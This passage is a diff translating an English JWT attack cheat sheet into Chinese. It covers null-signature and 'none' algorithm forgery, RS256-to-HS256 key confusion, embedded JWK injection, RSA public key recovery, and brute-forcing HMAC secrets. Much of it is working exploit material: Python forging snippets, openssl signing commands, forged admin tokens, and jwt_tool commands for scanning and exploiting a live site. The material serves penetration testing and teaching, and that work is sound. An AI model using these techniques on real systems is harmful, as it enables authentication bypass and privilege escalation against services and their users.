@@ -1,54 +1,56 @@
+[原文文档](README.en.md)
+
 # JWT - JSON Web Token
 
-> JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.
+> JSON Web Token (JWT) 是一种开放标准（RFC 7519），定义了一种紧凑且自包含的方式，用于在各方之间以JSON对象的形式安全传输信息。由于信息是数字签名的，因此可以进行验证和信任。
 
-## Summary
+## 目录
 
-- [Tools](#tools)
-- [JWT Format](#jwt-format)
-    - [Header](#header)
-    - [Payload](#payload)
-- [JWT Signature](#jwt-signature)
-    - [JWT Signature - Null Signature Attack (CVE-2020-28042)](#jwt-signature---null-signature-attack-cve-2020-28042)
-    - [JWT Signature - Disclosure of a correct signature (CVE-2019-7644)](#jwt-signature---disclosure-of-a-correct-signature-cve-2019-7644)
-    - [JWT Signature - None Algorithm (CVE-2015-9235)](#jwt-signature---none-algorithm-cve-2015-9235)
-    - [JWT Signature - Key Confusion Attack RS256 to HS256 (CVE-2016-5431)](#jwt-signature---key-confusion-attack-rs256-to-hs256-cve-2016-5431)
-    - [JWT Signature - Key Injection Attack (CVE-2018-0114)](#jwt-signature---key-injection-attack-cve-2018-0114)
-    - [JWT Signature - Recover Public Key From Signed JWTs](#jwt-signature---recover-public-key-from-signed-jwts)
-- [JWT Secret](#jwt-secret)
-    - [Encode and Decode JWT with the secret](#encode-and-decode-jwt-with-the-secret)
-    - [Break JWT secret](#break-jwt-secret)
-- [JWT Claims](#jwt-claims)
-    - [JWT kid Claim Misuse](#jwt-kid-claim-misuse)
-    - [JWKS - jku header injection](#jwks---jku-header-injection)
-- [Labs](#labs)
-- [References](#references)
+- [工具](#工具)
+- [JWT格式](#jwt格式)
+    - [头部](#头部)
+    - [载荷](#载荷)
+- [JWT签名](#jwt签名)
+    - [JWT签名 - 空签名攻击 (CVE-2020-28042)](#jwt签名---空签名攻击-cve-2020-28042)
+    - [JWT签名 - 正确签名的泄露 (CVE-2019-7644)](#jwt签名---正确签名的泄露-cve-2019-7644)
+    - [JWT签名 - None算法 (CVE-2015-9235)](#jwt签名---none算法-cve-2015-9235)
+    - [JWT签名 - 密钥混淆攻击 RS256转HS256 (CVE-2016-5431)](#jwt签名---密钥混淆攻击-rs256转hs256-cve-2016-5431)
+    - [JWT签名 - 密钥注入攻击 (CVE-2018-0114)](#jwt签名---密钥注入攻击-cve-2018-0114)
+    - [JWT签名 - 从已签名JWT中恢复公钥](#jwt签名---从已签名jwt中恢复公钥)
+- [JWT密钥](#jwt密钥)
+    - [使用密钥编码和解码JWT](#使用密钥编码和解码jwt)
+    - [破解JWT密钥](#破解jwt密钥)
+- [JWT声明](#jwt声明)
+    - [JWT kid声明滥用](#jwt-kid声明滥用)
+    - [JWKS - jku头部注入](#jwks---jku头部注入)
+- [实验](#实验)
+- [参考资料](#参考资料)
 
-## Tools
+## 工具
 
-- [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) -  🐍 A toolkit for testing, tweaking and cracking JSON Web Tokens
-- [brendan-rius/c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker) - JWT brute force cracker written in C
-- [PortSwigger/JOSEPH](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61) - JavaScript Object Signing and Encryption Pentesting Helper
-- [jwt.io](https://jwt.io/) - Encoder/Decoder
+- [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) -  🐍 用于测试、调整和破解JSON Web Token的工具包
+- [brendan-rius/c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker) - 用C编写的JWT暴力破解器
+- [PortSwigger/JOSEPH](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61) - JavaScript对象签名和加密渗透测试助手
+- [jwt.io](https://jwt.io/) - 编码器/解码器
 
-## JWT Format
+## JWT格式
 
 JSON Web Token : `Base64(Header).Base64(Data).Base64(Signature)`
 
-Example : `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY`
+示例 : `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY`
 
-Where we can split it into 3 components separated by a dot.
+我们可以将其分为3个由点分隔的组件。
 
 ```powershell
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # header
-eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # payload
-UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # 头部
+eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # 载荷
+UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # 签名
 ```
 
-### Header
+### 头部
 
-Registered header parameter names defined in [JSON Web Signature (JWS) RFC](https://www.rfc-editor.org/rfc/rfc7515).
-The most basic JWT header is the following JSON.
+在[JSON Web Signature (JWS) RFC](https://www.rfc-editor.org/rfc/rfc7515)中定义的注册头部参数名称。
+最基本的JWT头部是以下JSON。
 
 ```json
 {
@@ -57,44 +59,44 @@ The most basic JWT header is the following JSON.
 }
 ```
 
-Other parameters are registered in the RFC.
+其他参数在RFC中注册。
 
-| Parameter | Definition                           | Description |
+| 参数 | 定义 | 描述 |
 |-----------|--------------------------------------|-------------|
-| alg       | Algorithm                            | Identifies the cryptographic algorithm used to secure the JWS |
-| jku       | JWK Set URL                          | Refers to a resource for a set of JSON-encoded public keys    |
-| jwk       | JSON Web Key                         | The public key used to digitally sign the JWS                 |
-| kid       | Key ID                               | The key used to secure the JWS                                |
-| x5u       | X.509 URL                            | URL for the X.509 public key certificate or certificate chain |
-| x5c       | X.509 Certificate Chain              | X.509 public key certificate or certificate chain in PEM-encoded used to digitally sign the JWS |
-| x5t       | X.509 Certificate SHA-1 Thumbprint)  | Base64 url-encoded SHA-1 thumbprint (digest) of the DER encoding of the X.509 certificate       |
-| x5t#S256  | X.509 Certificate SHA-256 Thumbprint | Base64 url-encoded SHA-256 thumbprint (digest) of the DER encoding of the X.509 certificate     |
-| typ       | Type                                 | Media Type. Usually `JWT` |
-| cty       | Content Type                         | This header parameter is not recommended to use |
-| crit      | Critical                             | Extensions and/or JWA are being used |
+| alg | 算法 | 识别用于保护JWS的加密算法 |
+| jku | JWK集URL | 指向一组JSON编码的公钥资源 |
+| jwk | JSON Web密钥 | 用于数字签名JWS的公钥 |
+| kid | 密钥ID | 用于保护JWS的密钥 |
+| x5u | X.509 URL | X.509公钥证书或证书链的URL |
+| x5c | X.509证书链 | 用于数字签名JWS的PEM编码的X.509公钥证书或证书链 |
+| x5t | X.509证书SHA-1指纹) | X.509证书DER编码的Base64 url编码SHA-1指纹(摘要) |
+| x5t#S256 | X.509证书SHA-256指纹 | X.509证书DER编码的Base64 url编码SHA-256指纹(摘要) |
+| typ | 类型 | 媒体类型。通常为`JWT` |
+| cty | 内容类型 | 不建议使用此头部参数 |
+| crit | 关键 | 正在使用扩展和/或JWA |
 
-Default algorithm is "HS256" (HMAC SHA256 symmetric encryption).
-"RS256" is used for asymmetric purposes (RSA asymmetric encryption and private key signature).
+默认算法是"HS256"（HMAC SHA256对称加密）。
+"RS256"用于非对称目的（RSA非对称加密和私钥签名）。
 
-| `alg` Param Value  | Digital Signature or MAC Algorithm | Requirements |
+| `alg` 参数值 | 数字签名或MAC算法 | 要求 |
 |-------|------------------------------------------------|---------------|
-| HS256 | HMAC using SHA-256                             | Required      |
-| HS384 | HMAC using SHA-384                             | Optional      |
-| HS512 | HMAC using SHA-512                             | Optional      |
-| RS256 | RSASSA-PKCS1-v1_5 using SHA-256                | Recommended   |
-| RS384 | RSASSA-PKCS1-v1_5 using SHA-384                | Optional      |
-| RS512 | RSASSA-PKCS1-v1_5 using SHA-512                | Optional      |
-| ES256 | ECDSA using P-256 and SHA-256                  | Recommended   |
-| ES384 | ECDSA using P-384 and SHA-384                  | Optional      |
-| ES512 | ECDSA using P-521 and SHA-512                  | Optional      |
-| PS256 | RSASSA-PSS using SHA-256 and MGF1 with SHA-256 | Optional      |
-| PS384 | RSASSA-PSS using SHA-384 and MGF1 with SHA-384 | Optional      |
-| PS512 | RSASSA-PSS using SHA-512 and MGF1 with SHA-512 | Optional      |
-| none | No digital signature or MAC performed          | Required      |
+| HS256 | 使用SHA-256的HMAC | 必需 |
+| HS384 | 使用SHA-384的HMAC | 可选 |
+| HS512 | 使用SHA-512的HMAC | 可选 |
+| RS256 | 使用SHA-256的RSASSA-PKCS1-v1_5 | 推荐 |
+| RS384 | 使用SHA-384的RSASSA-PKCS1-v1_5 | 可选 |
+| RS512 | 使用SHA-512的RSASSA-PKCS1-v1_5 | 可选 |
+| ES256 | 使用P-256和SHA-256的ECDSA | 推荐 |
+| ES384 | 使用P-384和SHA-384的ECDSA | 可选 |
+| ES512 | 使用P-521和SHA-512的ECDSA | 可选 |
+| PS256 | 使用SHA-256和MGF1与SHA-256的RSASSA-PSS | 可选 |
+| PS384 | 使用SHA-384和MGF1与SHA-384的RSASSA-PSS | 可选 |
+| PS512 | 使用SHA-512和MGF1与SHA-512的RSASSA-PSS | 可选 |
+| none | 未执行数字签名或MAC | 必需 |
 
-Inject headers with [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool): `python3 jwt_tool.py JWT_HERE -I -hc header1 -hv testval1 -hc header2 -hv testval2`
+使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)注入头部：`python3 jwt_tool.py JWT_HERE -I -hc header1 -hv testval1 -hc header2 -hv testval2`
 
-### Payload
+### 载荷
 
 ```json
 {
@@ -105,71 +107,71 @@ Inject headers with [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool): `py
 }
 ```
 
-Claims are the predefined keys and their values:
+声明是预定义的键及其值：
 
-- iss: issuer of the token
-- exp: the expiration timestamp (reject tokens which have expired). Note: as defined in the spec, this must be in seconds.
-- iat: The time the JWT was issued. Can be used to determine the age of the JWT
-- nbf: "not before" is a future time when the token will become active.
-- jti: unique identifier for the JWT. Used to prevent the JWT from being re-used or replayed.
-- sub: subject of the token (rarely used)
-- aud: audience of the token (also rarely used)
+- iss: 令牌的发行者
+- exp: 过期时间戳（拒绝已过期的令牌）。注意：按照规范定义，这必须以秒为单位。
+- iat: JWT发出的时间。可用于确定JWT的年龄
+- nbf: "不早于"是令牌将变为活动的未来时间。
+- jti: JWT的唯一标识符。用于防止JWT被重复使用或重放。
+- sub: 令牌的主题（很少使用）
+- aud: 令牌的受众（也很少使用）
 
-Inject payload claims with [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool): `python3 jwt_tool.py JWT_HERE -I -pc payload1 -pv testval3`
+使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)注入载荷声明：`python3 jwt_tool.py JWT_HERE -I -pc payload1 -pv testval3`
 
-## JWT Signature
+## JWT签名
 
-### JWT Signature - Null Signature Attack (CVE-2020-28042)
+### JWT签名 - 空签名攻击 (CVE-2020-28042)
 
-Send a JWT with HS256 algorithm without a signature like `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.`
+发送一个没有签名的HS256算法的JWT，如`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.`
 
-**Exploit**:
+**利用**:
 
 ```ps1
 python3 jwt_tool.py JWT_HERE -X n
 ```
 
-**Deconstructed**:
+**解构**:
 
 ```json
 {"alg":"HS256","typ":"JWT"}.
 {"sub":"1234567890","name":"John Doe","iat":1516239022}
 ```
 
-### JWT Signature - Disclosure of a correct signature (CVE-2019-7644)
+### JWT签名 - 正确签名的泄露 (CVE-2019-7644)
 
-Send a JWT with an incorrect signature, the endpoint might respond with an error disclosing the correct one.
+发送一个具有错误签名的JWT，端点可能会响应错误并泄露正确的签名。
 
-- [jwt-dotnet/jwt: Critical Security Fix Required: You disclose the correct signature with each SignatureVerificationException... #61](https://github.com/jwt-dotnet/jwt/issues/61)
-- [CVE-2019-7644: Security Vulnerability in Auth0-WCF-Service-JWT](https://auth0.com/docs/secure/security-guidance/security-bulletins/cve-2019-7644)
+- [jwt-dotnet/jwt: 关键安全修复：您在每次SignatureVerificationException中泄露正确签名... #61](https://github.com/jwt-dotnet/jwt/issues/61)
+- [CVE-2019-7644: Auth0-WCF-Service-JWT中的安全漏洞](https://auth0.com/docs/secure/security-guidance/security-bulletins/cve-2019-7644)
 
 ```ps1
 Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
 Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=
 ```
 
-### JWT Signature - None Algorithm (CVE-2015-9235)
+### JWT签名 - None算法 (CVE-2015-9235)
 
-JWT supports a `None` algorithm for signature. This was probably introduced to debug applications. However, this can have a severe impact on the security of the application.
+JWT支持用于签名的`None`算法。这可能是为了调试应用程序而引入的。然而，这可能对应用程序的安全性产生严重影响。
 
-None algorithm variants:
+None算法变体：
 
 - `none`
 - `None`
 - `NONE`
 - `nOnE`
 
-To exploit this vulnerability, you just need to decode the JWT and change the algorithm used for the signature. Then you can submit your new JWT. However, this won't work unless you **remove** the signature
+要利用此漏洞，您只需解码JWT并更改用于签名的算法。然后您可以提交新的JWT。但是，除非您**移除**签名，否则这将不起作用
 
-Alternatively you can modify an existing JWT (be careful with the expiration time)
+或者您可以修改现有的JWT（注意过期时间）
 
-- Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
+- 使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
 
     ```ps1
     python3 jwt_tool.py [JWT_HERE] -X a
     ```
 
-- Manually editing the JWT
+- 手动编辑JWT
 
     ```python
     import jwt
@@ -177,20 +179,20 @@ Alternatively you can modify an existing JWT (be careful with the expiration tim
     jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
     decodedToken = jwt.decode(jwtToken, verify=False)       
 
-    # decode the token before encoding with type 'None'
+    # 在使用类型'None'进行编码之前解码令牌
     noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)
 
     print(noneEncoded.decode())
     ```
 
-### JWT Signature - Key Confusion Attack RS256 to HS256 (CVE-2016-5431)
+### JWT签名 - 密钥混淆攻击 RS256转HS256 (CVE-2016-5431)
 
-If a server’s code is expecting a token with "alg" set to RSA, but receives a token with "alg" set to HMAC, it may inadvertently use the public key as the HMAC symmetric key when verifying the signature.
+如果服务器代码期望接收"alg"设置为RSA的令牌，但接收了"alg"设置为HMAC的令牌，则在验证签名时可能会错误地将公钥用作HMAC对称密钥。
 
-Because the public key can sometimes be obtained by the attacker, the attacker can modify the algorithm in the header to HS256 and then use the RSA public key to sign the data. When the applications use the same RSA key pair as their TLS web server: `openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout`
+由于公钥有时可以被攻击者获取，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。当应用程序使用与其TLS Web服务器相同的RSA密钥对时：`openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout`
 
-> The algorithm **HS256** uses the secret key to sign and verify each message.
-> The algorithm **RS256** uses the private key to sign the message and uses the public key for authentication.
+> **HS256**算法使用密钥来签名和验证每条消息。
+> **RS256**算法使用私钥签名消息，并使用公钥进行身份验证。
 
 ```python
 import jwt
@@ -199,34 +201,34 @@ print public
 print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
 ```
 
-:warning: This behavior is fixed in the python library and will return this error `jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.`. You need to install the following version: `pip install pyjwt==0.4.3`.
+:warning: 此行为已在python库中修复，并将返回此错误`jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.`。您需要安装以下版本：`pip install pyjwt==0.4.3`。
 
-- Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
+- 使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
 
     ```ps1
     python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem
     ```
 
-- Using [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
-    1. Find the public key, usually in `/jwks.json` or `/.well-known/jwks.json`
-    2. Load it in the JWT Editor Keys tab, click `New RSA Key`.
-    3. . In the dialog, paste the JWK that you obtained earlier: `{"kty":"RSA","e":"AQAB","use":"sig","kid":"961a...85ce","alg":"RS256","n":"16aflvW6...UGLQ"}`
-    4. Select the PEM radio button and copy the resulting PEM key.
-    5. Go to the Decoder tab and Base64-encode the PEM.
-    6. Go back to the JWT Editor Keys tab and generate a `New Symmetric Key` in JWK format.
-    7. Replace the generated value for the k parameter with a Base64-encoded PEM key that you just copied.
-    8. Edit the JWT token alg to `HS256` and the data.
-    9. Click `Sign` and keep the option: `Don't modify header`
+- 使用[portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
+    1. 查找公钥，通常在`/jwks.json`或`/.well-known/jwks.json`中
+    2. 在JWT编辑器的Keys标签页中加载，点击`New RSA Key`。
+    3. . 在对话框中粘贴您之前获得的JWK：`{"kty":"RSA","e":"AQAB","use":"sig","kid":"961a...85ce","alg":"RS256","n":"16aflvW6...UGLQ"}`
+    4. 选择PEM单选按钮并复制生成的PEM密钥。
+    5. 转到Decoder标签页并Base64编码PEM。
+    6. 返回JWT编辑器的Keys标签页并生成JWK格式的`New Symmetric Key`。
+    7. 将k参数的生成值替换为您刚才复制的Base64编码的PEM密钥。
+    8. 编辑JWT令牌的alg为`HS256`和数据。
+    9. 点击`Sign`并保留选项：`Don't modify header`
 
-- Manually using the following steps to edit an RS256 JWT token into an HS256
-    1. Convert our public key (key.pem) into HEX with this command.
+- 手动使用以下步骤将RS256 JWT令牌编辑为HS256
+    1. 使用此命令将我们的公钥(key.pem)转换为HEX。
 
         ```powershell
         $ cat key.pem | xxd -p | tr -d "\\n"
         2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
         ```
 
-    2. Generate HMAC signature by supplying our public key as ASCII hex and with our token previously edited.
+    2. 通过提供我们的公钥作为ASCII十六进制和我们之前编辑的令牌来生成HMAC签名。
 
         ```powershell
         $ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
@@ -234,37 +236,37 @@ print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
         (stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0
         ```
 
-    3. Convert signature (Hex to "base64 URL")
+    3. 转换签名(十六进制到"base64 URL")
 
         ```powershell
         python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\")"
         ```
 
-    4. Add signature to edited payload
+    4. 将签名添加到编辑后的载荷
 
         ```powershell
         [HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE]
         eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA
         ```
 
-### JWT Signature - Key Injection Attack (CVE-2018-0114)
+### JWT签名 - 密钥注入攻击 (CVE-2018-0114)
 
-> A vulnerability in the Cisco node-jose open source library before 0.11.0 could allow an unauthenticated, remote attacker to re-sign tokens using a key that is embedded within the token. The vulnerability is due to node-jose following the JSON Web Signature (JWS) standard for JSON Web Tokens (JWTs). This standard specifies that a JSON Web Key (JWK) representing a public key can be embedded within the header of a JWS. This public key is then trusted for verification. An attacker could exploit this by forging valid JWS objects by removing the original signature, adding a new public key to the header, and then signing the object using the (attacker-owned) private key associated with the public key embedded in that JWS header.
+> Cisco node-jose开源库0.11.0版本之前的漏洞可能允许未经身份验证的远程攻击者使用嵌入在令牌中的密钥重新签署令牌。该漏洞是由于node-jose遵循JSON Web令牌(JWTs)的JSON Web签名(JWS)标准。该标准规定，表示公钥的JSON Web密钥(JWK)可以嵌入JWS的头部。该公钥随后被信任用于验证。攻击者可以通过删除原始签名，在头部添加新公钥，然后使用与嵌入在该JWS头部中的公钥相关的(攻击者拥有的)私钥签署对象来利用此漏洞伪造有效的JWS对象。
 
-**Exploit**:
+**利用**:
 
-- Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
+- 使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
 
     ```ps1
     python3 jwt_tool.py [JWT_HERE] -X i
     ```
 
-- Using [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
-    1. Add a `New RSA key`
-    2. In the JWT's Repeater tab, edit data
+- 使用[portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
+    1. 添加`New RSA key`
+    2. 在JWT的Repeater标签页中，编辑数据
     3. `Attack` > `Embedded JWK`
 
-**Deconstructed**:
+**解构**:
 
 ```json
 {
@@ -279,29 +281,29 @@ print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
   }
 }.
 {"login":"admin"}.
-[Signed with new Private key; Public key injected]
+[使用新的私钥签名；公钥注入]
 ```
 
-### JWT Signature - Recover Public Key From Signed JWTs
+### JWT签名 - 从已签名JWT中恢复公钥
 
-The RS256, RS384 and RS512 algorithms use RSA with PKCS#1 v1.5 padding as their signature scheme. This has the property that you can compute the public key given two different messages and accompanying signatures.
+RS256、RS384和RS512算法使用带有PKCS#1 v1.5填充的RSA作为其签名方案。这具有这样的特性：您可以给定两条不同的消息和相应的签名来计算公钥。
 
-[SecuraBV/jws2pubkey](https://github.com/SecuraBV/jws2pubkey): compute an RSA public key from two signed JWTs
+[SecuraBV/jws2pubkey](https://github.com/SecuraBV/jws2pubkey): 从两个已签名的JWT计算RSA公钥
 
 ```ps1
 $ docker run -it ttervoort/jws2pubkey JWS1 JWS2
 $ docker run -it ttervoort/jws2pubkey "$(cat sample-jws/sample1.txt)" "$(cat sample-jws/sample2.txt)" | tee pubkey.jwk
-Computing public key. This may take a minute...
+计算公钥。这可能需要一分钟...
 {"kty": "RSA", "n": "sEFRQzskiSOrUYiaWAPUMF66YOxWymrbf6PQqnCdnUla8PwI4KDVJ2XgNGg9XOdc-jRICmpsLVBqW4bag8eIh35PClTwYiHzV5cbyW6W5hXp747DQWan5lIzoXAmfe3Ydw65cXnanjAxz8vqgOZP2ptacwxyUPKqvM4ehyaapqxkBbSmhba6160PEMAr4d1xtRJx6jCYwQRBBvZIRRXlLe9hrohkblSrih8MdvHWYyd40khrPU9B2G_PHZecifKiMcXrv7IDaXH-H_NbS7jT5eoNb9xG8K_j7Hc9mFHI7IED71CNkg9RlxuHwELZ6q-9zzyCCcS426SfvTCjnX0hrQ", "e": "AQAB"}
 ```
 
-## JWT Secret
+## JWT密钥
 
-> To create a JWT, a secret key is used to sign the header and payload, which generates the signature. The secret key must be kept secret and secure to prevent unauthorized access to the JWT or tampering with its contents. If an attacker is able to access the secret key, they can create, modify or sign their own tokens, bypassing the intended security controls.
+> 要创建JWT，使用密钥对头部和载荷进行签名，从而生成签名。密钥必须保密并安全保存，以防止未经授权访问JWT或篡改其内容。如果攻击者能够访问密钥，他们可以创建、修改或签署自己的令牌，绕过预期的安全控制。
 
-### Encode and Decode JWT with the secret
+### 使用密钥编码和解码JWT
 
-- Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool):
+- 使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool):
 
     ```ps1
     jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds
@@ -315,7 +317,7 @@ Computing public key. This may take a minute...
     [+] name = "John Doe"
     ```
 
-- Using [pyjwt](https://pyjwt.readthedocs.io/en/stable/): `pip install pyjwt`
+- 使用[pyjwt](https://pyjwt.readthedocs.io/en/stable/): `pip install pyjwt`
 
     ```python
     import jwt
@@ -323,20 +325,20 @@ Computing public key. This may take a minute...
     jwt.decode(encoded, 'secret', algorithms=['HS256']) 
     ```
 
-### Break JWT secret
+### 破解JWT密钥
 
-Useful list of 3502 public-available JWT: [wallarm/jwt-secrets/jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list), including `your_jwt_secret`, `change_this_super_secret_random_string`, etc.
+3502个公开可用JWT的有用列表：[wallarm/jwt-secrets/jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)，包括`your_jwt_secret`，`change_this_super_secret_random_string`等。
 
-#### JWT tool
+#### JWT工具
 
-First, bruteforce the "secret" key used to compute the signature using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
+首先，使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)暴力破解用于计算签名的"secret"密钥
 
 ```powershell
 python3 -m pip install termcolor cprint pycryptodomex requests
 python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C
 ```
 
-Then edit the field inside the JSON Web Token.
+然后编辑JSON Web Token内部的字段。
 
 ```powershell
 Current value of role is: user
@@ -351,7 +353,7 @@ Please select a field number (or 0 to Continue):
 > 0
 ```
 
-Finally, finish the token by signing it with the previously retrieved "secret" key.
+最后，使用之前检索到的"secret"密钥对令牌进行签名以完成令牌。
 
 ```powershell
 Token Signing:
@@ -377,29 +379,29 @@ Your new forged token:
 [+] Standard: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic
 ```
 
-- Recon: `python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw`
-- Scanning: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -M pb`
-- Exploitation: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`
-- Fuzzing: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -I -hc kid -hv custom_sqli_vectors.txt`
-- Review: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`
+- 侦察: `python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw`
